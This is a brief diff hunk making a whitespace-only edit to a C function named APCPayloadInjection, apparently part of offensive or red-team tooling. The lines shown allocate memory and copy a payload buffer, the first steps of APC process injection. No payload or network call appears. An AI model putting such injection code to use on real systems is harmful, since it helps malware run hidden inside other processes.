@@ -11,7 +11,7 @@ BOOLEAN APCPayloadInjection
 
 	PVOID pLocalPayloadAddress = NULL;
 
-	if (!(pLocalPayloadAddress= VirtualAlloc(0, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return FALSE;
+	if (!(pLocalPayloadAddress = VirtualAlloc(0, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return FALSE;
 
 	if (!memcpy(pLocalPayloadAddress, pPayloadAddress, sPayloadSize)) return FALSE;
 
